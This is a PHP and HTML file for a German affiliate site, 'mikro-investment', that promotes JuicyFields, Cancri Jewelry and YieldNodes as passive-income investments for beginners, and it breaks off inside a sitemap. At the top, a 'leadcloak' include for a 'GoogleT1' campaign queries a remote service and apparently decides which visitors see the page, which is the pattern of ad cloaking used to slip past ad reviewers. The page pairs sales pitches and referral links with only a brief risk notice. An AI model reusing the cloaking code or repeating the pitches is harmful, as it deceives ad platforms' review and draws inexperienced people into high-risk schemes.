<?php
/**
 * Campaign: GoogleT1
 * Created: 2022-01-17 12:13:26 UTC
 */

require 'leadcloak-164rbxv5bvpi.php';

// ---------------------------------------------------
// Configuration

// Set this to false if application is properly installed.
$enableDebugging = false;

// Set this to false if you won't want to log error messages
$enableLogging = true;

if ($enableDebugging) {
	isApplicationReadyToRun();
}

$data = httpRequestMakePayload($campaignId, $campaignSignature);

$response = httpRequestExec($data);

$handler = httpHandleResponse($response, $enableLogging);

if ($handler) {
	exit();
}

?>

<!DOCTYPE html><html lang="de-DE"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Home</title><meta name="description" content="Startseite des des Investment Lexikon "><meta name="keywords" content="Investment, Invest, Krypto, Währung, Cannabis, medizinisches Cannabis, ewallet, Hub, Mining, Minting ,  Rendite, elektronische Brieftasche , Anlage, passiv einkommen, nebenverdienst, "><meta content="Home" property="og:title"><meta content="website" property="og:type"><meta content="http://511166783.swh.strato-hosting.eu/Startseite/" property="og:url"><meta content="images/Logo%20miktro%20Investment.png" property="og:image">


			
			<link xmlns="http://www.w3.org/1999/xhtml" rel="stylesheet" href="css/font-awesome.min.css">
			<link rel="stylesheet" type="text/css" href="css/widget-runtime.css">
<link rel="stylesheet" type="text/css" href="css/deploy.css">
<link rel="stylesheet" type="text/css" href="css/slideshow-common.css">

<link href="css/main.css" rel="stylesheet" type="text/css">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">

<link href="css/responsive.css" rel="stylesheet" type="text/css">

<link href="css/cm-templates-global-style.css" rel="stylesheet" type="text/css">
	
	

<link href="css/vars.css" type="text/css" rel="stylesheet"><style type="text/css">.cm-logo {background-image: url("images/Inverstment.jpeg");
        background-position: 50% 50%;
background-size: auto 145%;
background-repeat: no-repeat;
      }</style>
	  

		
		
		<link rel="shortcut icon" type="image/png" href="images/icon-32x32_6539dd6.png"><link rel="shortcut icon" sizes="196x196" href="images/icon-196x196_6539dd6.png"><link rel="apple-touch-icon" sizes="180x180" href="images/icon-180x180_6539dd6.png"><link rel="apple-touch-icon" sizes="120x120" href="images/icon-120x120_6539dd6.png"><link rel="apple-touch-icon" sizes="152x152" href="images/icon-152x152_6539dd6.png"><link rel="apple-touch-icon" sizes="76x76" href="images/icon-76x76_6539dd6.png"><meta name="msapplication-square70x70logo" content="/.cm4all/sysdb/favicon/icon-70x70_6539dd6.png"><meta name="msapplication-square150x150logo" content="/.cm4all/sysdb/favicon/icon-150x150_6539dd6.png"><meta name="msapplication-square310x310logo" content="/.cm4all/sysdb/favicon/icon-310x310_6539dd6.png"><link rel="shortcut icon" type="image/png" href="images/icon-48x48_6539dd6.png"><link rel="shortcut icon" type="image/png" href="images/icon-96x96_6539dd6.png"><style id="cm_table_styles">
      /*CM17e430edc12d16672ac18e11_begin*/
        #CM17e430edc12d16672ac18e11_div {
          margin: 0;
          padding: 0;
          
            width: 100%;
            max-width: 100%;
          
        }
        #CM17e430edc12d16672ac18e11 {
          border-spacing: 0px;
          
            width: 100%;
          
            margin: 10px -5px; 
            text-align: left;
          
            table-layout: fixed;
          
            width: calc(100% + 10px);
          
        }
        #CM17e430edc12d16672ac18e11 tr.cm_table {
          
            vertical-align: top;
          
        }
        #CM17e430edc12d16672ac18e11 td.cm_table {
            padding: 5px;
            
        }
        #CM17e430edc12d16672ac18e11 tr.cm_table.cm_firstrow td.cm_table {
          border-top: 0;
        }
        #CM17e430edc12d16672ac18e11 tr.cm_table.cm_lastrow td.cm_table {
          border-bottom: 0;
        }
        #CM17e430edc12d16672ac18e11 td.cm_table.cm_firstcol {
          border-left: 0;
        }
        #CM17e430edc12d16672ac18e11 td.cm_table.cm_lastcol {
          border-right: 0;
        }
      /*CM17e430edc12d16672ac18e11_end*/
    </style><style id="cm_background_queries">@media(min-width: 100px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-background{background-image:url("picture-200");}}@media(min-width: 100px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-background{background-image:url("picture-400");}}@media(min-width: 200px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-background{background-image:url("picture-400");}}@media(min-width: 200px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-background{background-image:url("picture-800");}}@media(min-width: 400px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-background{background-image:url("picture-800");}}@media(min-width: 400px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-background{background-image:url("picture-1200");}}@media(min-width: 600px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-background{background-image:url("picture-1200");}}@media(min-width: 600px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-background{background-image:url("picture-1600");}}@media(min-width: 800px), (min-resolution: 72dpi), (-webkit-min-device-pixel-ratio: 1) {.cm-background{background-image:url("picture-1600");}}@media(min-width: 800px), (min-resolution: 144dpi), (-webkit-min-device-pixel-ratio: 2) {.cm-background{background-image:url("images/maountain_bg_01.jpg");}}</style></head><body ondrop="return false;" class=" device-desktop cm-deploy cm-deploy-342 cm-deploy-4x"><div class="cm-background" data-cm-qa-bg="image"></div><div class="cm-background-video" data-cm-qa-bg="video"></div><div class="cm-background-effects" data-cm-qa-bg="effect"></div><div class="cm-templates-container content_wrapper"><div class="main_wrapper"><div class="header_wrapper"><div class="cm_can_be_empty" id="cm-template-logo-container"><div class="cm-templates-logo cm-logo" id="logo"></div></div><div class="title_wrapper cm_can_be_empty"><div class="title cm_can_be_empty cm-templates-heading__title" id="title" style><strong>Ihr</strong></div><div class="subtitle cm_can_be_empty cm-templates-heading__subtitle" id="subtitle" style><strong>Weg zur finanziellen Unabhängigkeit</strong></div></div></div><div class="navigation_wrapper" id="cm_navigation"><ul id="cm_mainnavigation"><li id="cm_navigation_pid_4807477" class="cm_current"><a title="Startseite" href="https://www.mikro-investment.de/Startseite/" class="cm_anchor">Startseite</a></li><li id="cm_navigation_pid_4973741" class="cm_has_subnavigation"><a title="Crowdfunding" href="https://www.mikro-investment.de/Crowdfunding/" class="cm_anchor">Crowdfunding</a></li><li id="cm_navigation_pid_4973748" class="cm_has_subnavigation"><a title="Medizinisches Cannabis" href="https://www.mikro-investment.de/Medizinisches-Cannabis/" class="cm_anchor">Medizinisches Cannabis</a></li><li id="cm_navigation_pid_5065916" class="cm_has_subnavigation"><a title="Krypto-Währungen &amp; eWallet" href="https://www.mikro-investment.de/Krypto-Waehrungen-eWallet/" class="cm_anchor">Krypto-Währungen &amp; eWallet</a></li><li id="cm_navigation_pid_4974424"><a title="Kontakt / Newsletter" href="https://www.mikro-investment.de/Kontakt/Newsletter/" class="cm_anchor">Kontakt / Newsletter</a></li><li id="cm_navigation_pid_4807473"><a title="Impressum/ Datenschutz" href="https://www.mikro-investment.de/Impressum/Datenschutz/" class="cm_anchor">Impressum/ Datenschutz</a></li></ul></div><div class="cm-template-keyvisual__media cm_can_be_empty cm-kv-0" id="keyvisual"></div><div class="table_wrapper"><div class="table_cell table_color_left"><div class="subnavigation_wrapper cm_with_forcesub" id="cm_subnavigation" style="display: none;"></div></div><div class="table_cell table_color_right"><div class="cm-template-content__main design_content cm-templates-text" id="content_main" data-cm-hintable="yes"><h1 style="text-align: center;"><span style="font-family: &quot;Big Shoulders Display&quot;;">Ihr Onlineverzeichnis </span><span style="font-family: &quot;Times New Roman&quot;, Times, serif;"> </span></h1><h2 style="text-align: center;"><span style="font-family: &quot;Times New Roman&quot;, Times, serif;">zum Thema Investment  für Beginner</span></h2><p>Hier  stelle ich mehrere Plattformen und Projekte vor die es Ihnen ermöglichen ein passives Einkommen im Nebenverdienst auf zu bauen.  Mikro-Investment steht für Möglichkeiten auch mit kleinen Geldbeutel zu investieren und so Geld zu verdienen.  Um das , vorhandene Risiko etwas zu minimieren sollte man sich dauerhaft breit auf mehreren Plattformen aufstellen, damit bei einem Ausfall der  Verlust nicht all zu hoch ist und von den anderen wieder auf gefangen werden kann.  Ich stelle vor allen Projekte aus dem Bereich des medizinischen Cannabis Anbau und aus der Rubrik der Kryptowährung rund um Trading, eWallets in der Welt von Bitcoin, Etherium, Litcoin, Dodgecoin &amp; Co vor. Ein besonderes  Concept ist das Grundeinkommen-Conzept das in einen ähnlichen Prinzip des Crowdfunding mit Ihrem Investment  sich an weiten Firmen und Projekten beteiligt und so Ihr passiv Einkommen sichert. </p><p><br></p><h2 style="text-align: center;"><strong style="font-size: 18px; font-family: &quot;Quattrocento Sans&quot;, sans-serif; background-color: #ffffff; color: #ff0000;">Das könnte auch Ihr Weg zum finanziellen Erfolgsgipfel werden! </strong></h2><div class="cm_column_wrapper"><div style="width: 50%;" class="cm_column cm_empty_editor"><p style="text-align: center;"><span style="font-family: Oswald, sans-serif;">Wie oft denkst du :</span></p><p style="text-align: center;"><span style="font-family: Oswald, sans-serif;">Hätte ich mal...?</span></p><p style="text-align: center;"><span style="font-family: Oswald, sans-serif;">Denn von nix kommt nix,</span></p><p style="text-align: center;"><br></p><p style="text-align: center;"><span style="font-family: Oswald, sans-serif;">Die hier vorgestellten  Programme ermöglichen jeden ein Start in die Welt des Investment.</span></p><p style="text-align: center;"><span style="font-family: Oswald, sans-serif;">Versuch es , damit es nicht mal wieder heißt , hätte ich mal...</span></p></div><div style="width: 7.5px;" class="cm_column_gap cm_column_gap_left"></div><div style="width: 7.5px;" class="cm_column_gap cm_column_gap_right"></div><div style="width: 50%;" class="cm_column"><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_cm4all_com_widgets_UroPhoto_36585573" class="
				    cm_widget_block
					cm_widget cm4all_com_widgets_UroPhoto cm_widget_block_center" style="width:72.9%; max-width:612px; "><div class="cm_widget_anchor"><a name="STRATP_cm4all_com_widgets_UroPhoto_36585573" id="widgetanchor_STRATP_cm4all_com_widgets_UroPhoto_36585573"><!--cm4all.com.widgets.UroPhoto--></a></div><div xmlns="http://www.w3.org/1999/xhtml" data-uro-type="image" style="width:100%;height:100%;" id="uroPhotoOuterSTRATP_cm4all_com_widgets_UroPhoto_36585573"><picture><source srcset="images/cahance-removebg-preview_1.png 1x, images/cahance-removebg-preview_1.png 2x" media="(min-width:1300px)"><source srcset="images/cahance-removebg-preview_1.png 1x, images/cahance-removebg-preview_1.png 2x" media="(min-width:800px)"><source srcset="images/cahance-removebg-preview_1.png 1x, images/cahance-removebg-preview_1.png 2x" media="(min-width:600px)"><source srcset="images/cahance-removebg-preview_1.png 1x, images/cahance-removebg-preview_1.png 2x" media="(min-width:400px)"><source srcset="picture-400_2 1x, images/cahance-removebg-preview_1.png 2x" media="(min-width:200px)"><source srcset="picture-200_5 1x, picture-400_2 2x" media="(min-width:100px)"><img src="picture-200_5" data-uro-original="/.cm4all/uproc.php/0/cahance-removebg-preview_1.png?_=17a1b7bb128" onerror="uroGlobal().util.error(this, '', 'uro-widget')" data-uro-width="612" data-uro-height="408" alt style="width:100%;" title loading="lazy"></picture><span></span></div></div><p><br></p></div></div><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_com_cm4all_wdn_Separatingline_36370046" class="
				    cm_widget_block
					cm_widget com_cm4all_wdn_Separatingline cm_widget_block_center" style="width:100%; max-width:100%; "><div class="cm_widget_anchor"><a name="STRATP_com_cm4all_wdn_Separatingline_36370046" id="widgetanchor_STRATP_com_cm4all_wdn_Separatingline_36370046"><!--com.cm4all.wdn.Separatingline--></a></div>
					
				

<div class="cm-widget_separatingline cm-w_sl-icon cm-w_sl-i25 cm-w_sl-center" style="margin: 1% 0% 1% 0%;"><div class="cm-widget_separatingline cm-w_sl-h2 cm-w_sl-straight" style></div><i class="fa fa-angle-down"></i><div class="cm-widget_separatingline cm-w_sl-h2 cm-w_sl-straight" style></div></div>
</div><p style="text-align: center;"><br></p><div class="cm_column_wrapper"><div style="width: 33.3333%;" class="cm_column"><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_cm4all_com_widgets_UroPhoto_36370076" class="
				    cm_widget_block
					cm_widget cm4all_com_widgets_UroPhoto cm_widget_block_center" style="width:100%; max-width:583px; "><div class="cm_widget_anchor"><a name="STRATP_cm4all_com_widgets_UroPhoto_36370076" id="widgetanchor_STRATP_cm4all_com_widgets_UroPhoto_36370076"><!--cm4all.com.widgets.UroPhoto--></a></div><div xmlns="http://www.w3.org/1999/xhtml" data-uro-type="image" style="width:100%;height:100%;" id="uroPhotoOuterSTRATP_cm4all_com_widgets_UroPhoto_36370076"><a rel="noreferrer noopener" target="STRATP_cm4all_com_widgets_UroPhoto_36370076" href="https://juicyfields.io/?source=CS23061985HP" style="border:none"><picture><source srcset="images/ideal_f%C3%BCr_Anf%C3%A4nger-removebg-preview.png 1x, images/ideal_f%C3%BCr_Anf%C3%A4nger-removebg-preview.png 2x" media="(min-width:1300px)"><source srcset="images/ideal_f%C3%BCr_Anf%C3%A4nger-removebg-preview.png 1x, images/ideal_f%C3%BCr_Anf%C3%A4nger-removebg-preview.png 2x" media="(min-width:800px)"><source srcset="images/ideal_f%C3%BCr_Anf%C3%A4nger-removebg-preview.png 1x, images/ideal_f%C3%BCr_Anf%C3%A4nger-removebg-preview.png 2x" media="(min-width:600px)"><source srcset="images/ideal_f%C3%BCr_Anf%C3%A4nger-removebg-preview.png 1x, images/ideal_f%C3%BCr_Anf%C3%A4nger-removebg-preview.png 2x" media="(min-width:400px)"><source srcset="picture-400_3 1x, images/ideal_f%C3%BCr_Anf%C3%A4nger-removebg-preview.png 2x" media="(min-width:200px)"><source srcset="picture-200_2 1x, picture-400_3 2x" media="(min-width:100px)"><img src="picture-200_2" data-uro-original="/.cm4all/uproc.php/0/ideal_f%C3%BCr_Anf%C3%A4nger-removebg-preview.png?_=17a9bc13b50" onerror="uroGlobal().util.error(this, '', 'uro-widget')" data-uro-width="583" data-uro-height="428" alt style="width:100%;" title loading="lazy"></picture><span></span></a></div></div><p style="text-align: center;"><br></p></div><div style="width: 7.5px;" class="cm_column_gap cm_column_gap_left"></div><div style="width: 7.5px;" class="cm_column_gap cm_column_gap_right"></div><div style="width: 33.3333%;" class="cm_column"><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_cm4all_com_widgets_UroPhoto_36370080" class="
				    cm_widget_block
					cm_widget cm4all_com_widgets_UroPhoto cm_widget_block_center" style="width:34.3%; max-width:2222px; "><div class="cm_widget_anchor"><a name="STRATP_cm4all_com_widgets_UroPhoto_36370080" id="widgetanchor_STRATP_cm4all_com_widgets_UroPhoto_36370080"><!--cm4all.com.widgets.UroPhoto--></a></div><div xmlns="http://www.w3.org/1999/xhtml" data-uro-type="image" style="width:100%;height:100%;" id="uroPhotoOuterSTRATP_cm4all_com_widgets_UroPhoto_36370080"><a rel="noreferrer noopener" target="STRATP_cm4all_com_widgets_UroPhoto_36370080" href="https://juicyfields.io/?source=CS23061985HP" style="border:none"><picture><source srcset="images/Logo%20Juicy%20Fields.png 1x, images/Logo%20Juicy%20Fields.png 2x" media="(min-width:1300px)"><source srcset="picture-1600_1 1x, images/Logo%20Juicy%20Fields.png 2x" media="(min-width:800px)"><source srcset="picture-1200_1 1x, picture-1600_1 2x" media="(min-width:600px)"><source srcset="picture-800_1 1x, picture-1200_1 2x" media="(min-width:400px)"><source srcset="picture-400_1 1x, picture-800_1 2x" media="(min-width:200px)"><source srcset="picture-200_1 1x, picture-400_1 2x" media="(min-width:100px)"><img src="picture-200_1" data-uro-original="/.cm4all/uproc.php/0/Logo%20Juicy%20Fields.png?_=17a9174dd28" onerror="uroGlobal().util.error(this, '', 'uro-widget')" data-uro-width="2222" data-uro-height="2222" alt style="width:100%;" title loading="lazy"></picture><span></span></a></div></div><div style="text-align: center;"><span style="font-size: 18px; font-family: &quot;Quattrocento Sans&quot;, sans-serif;"><strong>Juicy Fields</strong></span></div><ul><li>einstieg bereits ab 50 €uro</li><li>übersichtliche Plattform</li><li>mehrsprachig</li></ul><p style="text-align: center;"><br></p><div style="text-align: center;"><a href="https://www.mikro-investment.de/Medizinisches-Cannabis/Juicy-Fields/" class="cm_anchor">Mehr Infos in unserer Rubrik</a></div><p> </p><p style="text-align: center;"><span style="text-align: center;"><a href="https://www.mikro-investment.de/Medizinisches-Cannabis/Juicy-Fields/" class="cm_anchor"> medizinisches Cannabis.</a></span></p></div><div style="width: 7px;" class="cm_column_gap cm_column_gap_left"></div><div style="width: 7px;" class="cm_column_gap cm_column_gap_right"></div><div style="width: 33.3333%;" class="cm_column"><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_cm4all_com_widgets_UroPhoto_36370078" class="
				    cm_widget_block
					cm_widget cm4all_com_widgets_UroPhoto cm_widget_block_center" style="width:100%; max-width:336px; "><div class="cm_widget_anchor"><a name="STRATP_cm4all_com_widgets_UroPhoto_36370078" id="widgetanchor_STRATP_cm4all_com_widgets_UroPhoto_36370078"><!--cm4all.com.widgets.UroPhoto--></a></div><div xmlns="http://www.w3.org/1999/xhtml" data-uro-type="image" style="width:100%;height:100%;" id="uroPhotoOuterSTRATP_cm4all_com_widgets_UroPhoto_36370078"><a rel="noreferrer noopener" target="STRATP_cm4all_com_widgets_UroPhoto_36370078" href="https://juicyfields.io/?source=CS23061985HP" style="border:none"><img src="images/JuicyFields-336x280.gif" data-uro-original="/.cm4all/uproc.php/0/JuicyFields-336x280.gif?_=17a91aac9d8" onerror="uroGlobal().util.error(this, '', 'uro-widget')" data-uro-width="336" data-uro-height="280" alt style="width:100%;" title loading="lazy"><span></span></a></div></div><p><br></p></div></div><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_com_cm4all_wdn_Separatingline_36370059" class="
				    cm_widget_block
					cm_widget com_cm4all_wdn_Separatingline cm_widget_block_center" style="width:100%; max-width:100%; "><div class="cm_widget_anchor"><a name="STRATP_com_cm4all_wdn_Separatingline_36370059" id="widgetanchor_STRATP_com_cm4all_wdn_Separatingline_36370059"><!--com.cm4all.wdn.Separatingline--></a></div>
					


<div class="cm-widget_separatingline cm-w_sl-icon cm-w_sl-i10" style="margin: 1% 0% 1% 0%;"><div class="cm-widget_separatingline cm-w_sl-h1 cm-w_sl-straight" style></div><i class="fa fa-arrow-up"></i><div class="cm-widget_separatingline cm-w_sl-h1 cm-w_sl-straight" style></div></div>
</div><p><br></p><table id="CM17e430edc12d16672ac18e11" class="cm_table"><tbody class="cm_table"><tr class="cm_table cm_firstrow cm_lastrow"><td style="text-align: center;" class="cm_table cm_firstcol"><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_cm4all_com_widgets_UroPhoto_38896542" class="cm_widget cm4all_com_widgets_UroPhoto cm_widget_inline_block_center" style="width:100%; max-width:100%; "><div class="cm_widget_anchor"><a name="STRATP_cm4all_com_widgets_UroPhoto_38896542" id="widgetanchor_STRATP_cm4all_com_widgets_UroPhoto_38896542"><!--cm4all.com.widgets.UroPhoto--></a></div><div xmlns="http://www.w3.org/1999/xhtml" data-uro-type="image" style="width:100%;height:100%;" id="uroPhotoOuterSTRATP_cm4all_com_widgets_UroPhoto_38896542"><a rel="noreferrer noopener" target="STRATP_cm4all_com_widgets_UroPhoto_38896542" href="https://account.cancrijewelry.diamonds/auth/register?refer_id=729146" style="border:none"><img src="fonts/logo.svg" data-uro-original="/.cm4all/uproc.php/0/Cancri/logo.svg?_=17d105e1120" onerror="uroGlobal().util.error(this, '', 'uro-widget')" alt style="width:100%;" title loading="lazy">

<span></span></a></div></div><p> </p><p>Cancri Jewelry bietet Ihnen die Möglichkeit  mit Produkten rund um Gold Silber, Diamanten und Co. Ihr Investment profitabel zu machen.</p><p><a href="https://www.mikro-investment.de/Crowdfunding/Cancri-Jewelry-GOLD-Invest/" class="cm_anchor">Mehr Infos &gt;&gt;&gt;</a></p></td><td style="text-align: center;" class="cm_table"><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_cm4all_com_widgets_Scroller_38896476" class="cm_widget cm4all_com_widgets_Scroller cm_widget_inline_block_center" style="width:100%; max-width:100%; "><div class="cm_widget_anchor"><a name="STRATP_cm4all_com_widgets_Scroller_38896476" id="widgetanchor_STRATP_cm4all_com_widgets_Scroller_38896476"><!--cm4all.com.widgets.Scroller--></a></div>
<div class="scroller-container"><div class="scroller-box" id="scroller_STRATP_cm4all_com_widgets_Scroller_38896476"> </div></div></div><p><br></p><ul><li>tägliche Auszahlungen</li><li>Bonus Programme</li><li>Guthaben auch im Ladengeschäft einlösbar</li></ul></td><td style="text-align: center;" class="cm_table cm_lastcol"><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_cm4all_com_widgets_UroPhoto_38896738" class="cm_widget cm4all_com_widgets_UroPhoto cm_widget_inline_block_center" style="width:52%; max-width:611px; "><div class="cm_widget_anchor"><a name="STRATP_cm4all_com_widgets_UroPhoto_38896738" id="widgetanchor_STRATP_cm4all_com_widgets_UroPhoto_38896738"><!--cm4all.com.widgets.UroPhoto--></a></div><div xmlns="http://www.w3.org/1999/xhtml" data-uro-type="image" style="width:100%;height:100%;" id="uroPhotoOuterSTRATP_cm4all_com_widgets_UroPhoto_38896738"><picture><source srcset="images/Angebot-removebg-preview.png 1x, images/Angebot-removebg-preview.png 2x" media="(min-width:1300px)"><source srcset="images/Angebot-removebg-preview.png 1x, images/Angebot-removebg-preview.png 2x" media="(min-width:800px)"><source srcset="images/Angebot-removebg-preview.png 1x, images/Angebot-removebg-preview.png 2x" media="(min-width:600px)"><source srcset="images/Angebot-removebg-preview.png 1x, images/Angebot-removebg-preview.png 2x" media="(min-width:400px)"><source srcset="picture-400_4 1x, images/Angebot-removebg-preview.png 2x" media="(min-width:200px)"><source srcset="picture-200_3 1x, picture-400_4 2x" media="(min-width:100px)"><img src="picture-200_3" data-uro-original="/.cm4all/uproc.php/0/Cancri/Angebot-removebg-preview.png?_=17e431f4873" onerror="uroGlobal().util.error(this, '', 'uro-widget')" data-uro-width="611" data-uro-height="408" alt style="width:100%;" title loading="lazy"></picture><span></span></div></div><p><br></p><p>Er halten Sie mit meine Anmeldelink aktuell beim Kauf der ersten Investment Card 30 % Extra!</p></td></tr></tbody></table><p> </p><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_com_cm4all_wdn_Separatingline_38896465" class="
				    cm_widget_block
					cm_widget com_cm4all_wdn_Separatingline cm_widget_block_center" style="width:100%; max-width:100%; "><div class="cm_widget_anchor"><a name="STRATP_com_cm4all_wdn_Separatingline_38896465" id="widgetanchor_STRATP_com_cm4all_wdn_Separatingline_38896465"><!--com.cm4all.wdn.Separatingline--></a></div>
					
					
					
<div class="cm-widget_separatingline cm-w_sl-h1 cm-w_sl-straight" style="margin: 1% 0% 1% 0%;"></div>
</div><p style="text-align: center;"><br></p><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_cm4all_com_widgets_Scroller_34776406" class="
				    cm_widget_block
					cm_widget cm4all_com_widgets_Scroller cm_widget_block_center" style="width:100%; max-width:100%; "><div class="cm_widget_anchor"><a name="STRATP_cm4all_com_widgets_Scroller_34776406" id="widgetanchor_STRATP_cm4all_com_widgets_Scroller_34776406"><!--cm4all.com.widgets.Scroller--></a></div>
					
				
			<div class="scroller-container"><div class="scroller-box" id="scroller_STRATP_cm4all_com_widgets_Scroller_34776406"> </div></div></div><p style="text-align: center;"><br></p><p><span style="font-family: Roboto, Helvetica, Arial, sans-serif; background-color: #000000; color: #ff0000;">Risikohinweis: Investments beinhalten ein substanzielles Risiko und sind nicht für jeden geeignet. Ein Investor kann potenziell das gesamte oder mehr als das getätigte Investment verlieren. Risikokapital sind Gelder, wenn sie verloren werden, die eigene finanzielle Sicherheit oder Lebensstil nicht gefährden. Nur Risikokapital sollte für Investments eingesetzt werden und nur von denen, die ausreichend Risikokapital zur Verfügung haben.</span><br></p><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_com_cm4all_wdn_social_FacebookPage_36154340" class="
				    cm_widget_block
					cm_widget com_cm4all_wdn_social_FacebookPage cm_widget_block_center" style="width:100%; max-width:100%; "><div class="cm_widget_anchor"><a name="STRATP_com_cm4all_wdn_social_FacebookPage_36154340" id="widgetanchor_STRATP_com_cm4all_wdn_social_FacebookPage_36154340"><!--com.cm4all.wdn.social.FacebookPage--></a></div><a class="cm4all-cookie-consent" href="https://www.mikro-investment.de/index.php/;focus=STRATP_com_cm4all_wdn_social_FacebookPage_36154340&amp;frame=STRATP_com_cm4all_wdn_social_FacebookPage_36154340" data-wcid="com.cm4all.wdn.social.FacebookPage" data-wiid="STRATP_com_cm4all_wdn_social_FacebookPage_36154340" data-lazy="true" data-thirdparty="true" data-statistics="false" rel="nofollow" data-blocked="true"><!--STRATP_com_cm4all_wdn_social_FacebookPage_36154340--></a></div><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_cm4all_com_widgets_UroPhoto_36560392" class="
				    cm_widget_block
					cm_widget cm4all_com_widgets_UroPhoto cm_widget_block_center" style="width:100%; max-width:1140px; "><div class="cm_widget_anchor"><a name="STRATP_cm4all_com_widgets_UroPhoto_36560392" id="widgetanchor_STRATP_cm4all_com_widgets_UroPhoto_36560392"><!--cm4all.com.widgets.UroPhoto--></a></div><div xmlns="http://www.w3.org/1999/xhtml" data-uro-type="image" style="width:100%;height:100%;" id="uroPhotoOuterSTRATP_cm4all_com_widgets_UroPhoto_36560392"><a rel="noreferrer noopener" target="STRATP_cm4all_com_widgets_UroPhoto_36560392" href="https://members.yieldnodes.com/c/?a=zwLd2Q2ZENQPVYx&amp;redirect=signup" style="border:none"><picture><source srcset="images/Banner.png 1x, images/Banner.png 2x" media="(min-width:1300px)"><source srcset="images/Banner.png 1x, images/Banner.png 2x" media="(min-width:800px)"><source srcset="images/Banner.png 1x, images/Banner.png 2x" media="(min-width:600px)"><source srcset="images/Banner.png 1x, images/Banner.png 2x" media="(min-width:400px)"><source srcset="images/Banner.png 1x, images/Banner.png 2x" media="(min-width:200px)"><source srcset="images/Banner.png 1x, images/Banner.png 2x" media="(min-width:100px)"><img src="images/Banner.png" data-uro-original="/.cm4all/uproc.php/0/Juicy%20Fields/Banner.png?_=17a923a5fa8" onerror="uroGlobal().util.error(this, '', 'uro-widget')" data-uro-width="1140" data-uro-height="150" alt style="width:100%;" title loading="lazy"></picture><span></span></a></div></div><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_com_cm4all_wdn_Separatingline_33584204" class="
				    cm_widget_block
					cm_widget com_cm4all_wdn_Separatingline cm_widget_block_center" style="width:100%; max-width:100%; "><div class="cm_widget_anchor"><a name="STRATP_com_cm4all_wdn_Separatingline_33584204" id="widgetanchor_STRATP_com_cm4all_wdn_Separatingline_33584204"><!--com.cm4all.wdn.Separatingline--></a></div>
					


<div class="cm-widget_separatingline cm-w_sl-h1 cm-w_sl-straight" style="margin: 1% 0% 1% 0%;"></div>
</div><p style="text-align: left;"><span style="color: #555555; font-size: 14px; background-color: rgba(244, 244, 244, 0.95);"> <span style="font-size: 11px; font-family: Roboto, sans-serif;">bezahlte Werbung, Affiliate-Link enthalten</span></span><br></p><div class="clearFloating" style="clear:both;height: 0px; width: auto;"></div><div id="widgetcontainer_STRATP_cm4all_com_widgets_SitemapSites_34776357" class="
				    cm_widget_block
					cm_widget cm4all_com_widgets_SitemapSites cm_widget_block_center" style="width:100%; max-width:100%; "><div class="cm_widget_anchor"><a name="STRATP_cm4all_com_widgets_SitemapSites_34776357" id="widgetanchor_STRATP_cm4all_com_widgets_SitemapSites_34776357"><!--cm4all.com.widgets.SitemapSites--></a></div><div style="width:100%;"><div><table style="border-collapse: collapse;"><tr><td colspan="21" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Startseite/" style="font-size:120%; ">Startseite</a></td></tr><tr><td></td></tr><tr><td colspan="21" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Crowdfunding/" style="font-size:120%; ">Crowdfunding</a></td></tr><tr><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Crowdfunding/Juicy-Fields/" style>Juicy Fields</a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Crowdfunding/Cancri-Jewelry-GOLD-Invest/" style>Cancri Jewelry GOLD Invest</a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; font-size: 50%; ">
					​
				</td><td></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
				</td><td style="width: 10px; border-left: solid 1px ; border-bottom: solid 1px ; font-size: 50%; ">
					​
				</td><td colspan="19" rowspan="2" valign="middle" style="padding: 5px; "><a href="https://www.mikro-investment.de/Crowdfunding/Yosemite-EP/" style>Yosemite EP </a></td></tr><tr><td style="width: 10px; font-size: 50%; ">
					​
